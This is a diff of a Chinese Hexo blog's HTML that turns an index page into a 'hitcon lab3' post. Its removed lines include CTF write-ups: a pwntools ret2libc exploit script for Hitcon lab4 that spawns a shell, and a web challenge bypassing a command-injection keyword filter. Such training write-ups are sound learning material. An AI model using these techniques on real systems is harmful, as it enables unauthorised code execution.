@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-     子非鱼ziky
+    hitcon  lab3  |  子非鱼ziky
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -42,297 +42,8 @@
     
       
     <main class="content on">
-      
-<section class="cover">
-    
-  <div class="cover-frame">
-    <div class="bg-box">
-      <img src="/images/bg.jpg" alt="image frame" />
-    </div>
-    <div class="cover-inner text-center text-white">
-      <h1><a href="/">子非鱼ziky</a></h1>
-      <div id="subtitle-box">
-        
-        <span id="subtitle"></span>
-        
-      </div>
-      <div>
-        
-      </div>
-    </div>
-  </div>
-  <div class="cover-learn-more">
-    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
-  </div>
-</section>
-
-
-
-<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>
-
-
-<!-- Subtitle -->
-
-  <script>
-    try {
-      var typed = new Typed("#subtitle", {
-        strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
-        startDelay: 0,
-        typeSpeed: 200,
-        loop: true,
-        backSpeed: 100,
-        showCursor: true
-      });
-    } catch (err) {
-      console.log(err)
-    }
-  </script>
-  
-<div id="main">
-  <section class="outer">
-  <article class="articles">
-    
-    
-    
-    
-    <article
-  id="post-test"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/07/24/test/"
-    >test</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2020/07/24/test/" class="article-date">
-  <time datetime="2020-07-24T15:07:33.000Z" itemprop="datePublished">2020-07-24</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p>11111111</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/test1/" rel="tag">test1</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/test2/" rel="tag">test2</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-    <article
-  id="post-Hitcon-lab4"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/04/24/Hitcon-lab4/"
-    >Hitcon_lab4</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/04/24/Hitcon-lab4/" class="article-date">
-  <time datetime="2019-04-24T13:32:39.000Z" itemprop="datePublished">2019-04-24</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/">逆向学习</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p>lab4是一道 return to libc 的题，</p>
-<pre><code>首先checksec一下</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc067abaa659.png" alt></p>
-<pre><code>可以看到没有开栈保护，开了NX了，可以栈溢出
-
-file 一下 ret2lib ，返回32位
-
-用ida打开文件分析一下</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc068d80b6c5.png" alt></p>
-<pre><code>这里两个地方值得注意：
-    1、see_something()这个函数可以将你输入的地址找到其在运行中的真实地址
-
-    2、像read，puts这样简单的函数可以被用来寻找偏移量
-
-通过这两点可以用see_something()这个函数，将puts函数的真实地址返回出来
-
-接下来就是找到libc的真实地址，计算偏移量，然后计算出system的真实地址，最后是计算出&quot;bin/sh&quot;真实地址拿到shell
-
-exp：
-
-#-*-coding:utf8-*-
-from pwn import *
-
-io = process(&quot;./ret2lib&quot;)
-elf = ELF(&quot;./ret2lib&quot;)
-
-libc = ELF(&quot;/lib32/libc.so.6&quot;)
-
-puts_libc = libc.symbols[&quot;puts&quot;]
-print &quot;puts_libc&quot; + hex(puts_libc) 
-
-system_libc = libc.symbols[&quot;system&quot;]
-
-binsh_libc = libc.search(&apos;/bin/sh&apos;).next()
-print &quot;binsh_libc&quot; + hex(binsh_libc)
-
-puts_plt = elf.plt[&quot;puts&quot;]
-print &quot;puts_plt:&quot; + hex(puts_plt)
-
-puts_got = elf.got[&quot;puts&quot;]
-print &quot;puts_got:&quot; + hex(puts_got)
-
-io.recvuntil(&quot;:&quot;)
-io.sendline(str(puts_got))
-
-io.recvuntil(&apos;0x&apos;)
-puts_addr = int(io.reuntil(&apos;\n&apos;),16)
-print &quot;puts_addr:&quot; + hex(puts_addr) //获得puts地址
-
-main = 0x0804857d  //通过ida找出mian的地址
-
-offset = puts_addr - puts_libc  //计算偏移量
-system_addr = system_libc + offset  //system地址
-binsh =  binsh_libc + offset  // bin/sh地址
-
-io.recvuntil(&quot;:&quot;)
-payload = &apos;a&apos; * 60
-payload += p32(system_addr) + p32(main) + p32(binsh)
-
-
-io.sendline(payload)
-io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3cdfb2d.png" alt></p>
-<pre><code>拿到shell</code></pre> 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hitcon/" rel="tag">Hitcon</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-    <article
-  id="post-calc2"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/04/19/calc2/"
-    >calc2</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/04/19/calc2/" class="article-date">
-  <time datetime="2019-04-19T09:38:14.000Z" itemprop="datePublished">2019-04-19</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p>今天做了一个web题，emmmm，以前没有遇到过，涨姿势。。。</p>
-<pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p>
-<pre><code>首先是 shell_exec（） 这个函数，百度查了一下，命令执行，emmm</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99b6feb0c6.png" alt></p>
-<pre><code>首先是将输入的 &amp;str 传入 bc 再通过shell_exec() 执行，再echo回显出来</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ce305a30.png" alt></p>
-<pre><code>ls一下看到了当前文件夹下的文件，flag就在里面
-
-接着打算直接cat flag，然而并不行
-
-if(!empty($_GET)){
-$str=$_GET[&quot;calc&quot;];
-if(strpos($str,&quot;#&quot;)!==false)
-    die;
-if(strpos($str,&quot;`&quot;)!==false)
-    die;
-if(strpos($str,&quot;flag&quot;)!==false)
-    die;
-
-成了,flag被过滤了
-
-嗯，换一个命令 grep </code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ebfcf1e8.png" alt></p>
-<pre><code>拿到flag</code></pre> 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-    <article
+      <section class="outer">
+  <article
   id="post-hitcon-lab3"
   class="article article-type-post"
   itemscope
@@ -343,10 +54,9 @@ if(strpos($str,&quot;flag&quot;)!==false)
     
     <header class="article-header">
        
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/04/18/hitcon-lab3/"
-    >hitcon  lab3 </a> 
-</h2>
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  hitcon  lab3 
+</h1>
  
 
     </header>
@@ -358,9 +68,32 @@ if(strpos($str,&quot;flag&quot;)!==false)
   <div class="article-category">
     <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/">逆向学习</a>
   </div>
-   
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">159</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">1 min</span>
+        </span>
+    </span>
+</div>
+ 
     </div>
       
+
+
+
+  
     <div class="article-entry" itemprop="articleBody">
        
   <p>lab3这道题是一个基本的栈溢出</p>
@@ -396,101 +129,152 @@ io.interactive()
 <pre><code>ok，拿到shell，直接cat flag就行了</code></pre> 
       <!-- reward -->
       
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hitcon/" rel="tag">Hitcon</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-    <article
-  id="post-Hitcon-lab1"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/04/17/Hitcon-lab1/"
-    >Hitcon lab1</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/04/17/Hitcon-lab1/" class="article-date">
-  <time datetime="2019-04-17T12:07:14.000Z" itemprop="datePublished">2019-04-17</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/">逆向学习</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p>做为一个刚开始学习pwn的小白，很多地方都不会，DALAO勿喷…</p>
-<pre><code>Hitcon这个是le3ding大佬推给我的
-
-
-这个是GitHub地址 https://github.com/scwuaptx/HITCON-Training 有需要的可以自己git
-
-
-——————————分割线——————————
-
-lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb用法
-
-用ida打开可以看到get_flag这个函数</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71ac83b8f4.png" alt></p>
-<pre><code>然后查看sysmagic.c文件</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71f4f9d05f.png" alt></p>
-<pre><code>经过观察，flag的生成与输入无关，因此可以通过调试直接获得flag
-
-将if(password == magic)改为if(password ！= magic)
-
-运行./sysmagic</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb7219445d51.png" alt></p>
- 
-      <!-- reward -->
+      <div id="reward-btn">
+        Donate
+      </div>
       
     </div>
     
 
     <!-- copyright -->
     
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+        </li>
+      </ul>
+    </div>
+    
     <footer class="article-footer">
        
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hitcon/" rel="tag">Hitcon</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-  </article>
-  
-
-  
-</section>
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
 </div>
 
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2019/04/18/hitcon-lab3/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hitcon/" rel="tag">Hitcon</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2019/04/19/calc2/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            calc2
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/04/17/Hitcon-lab1/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Hitcon lab1</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
       <footer class="footer">
   <div class="outer">
     <ul>
@@ -632,6 +416,23 @@ lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb�
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
 
 <script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
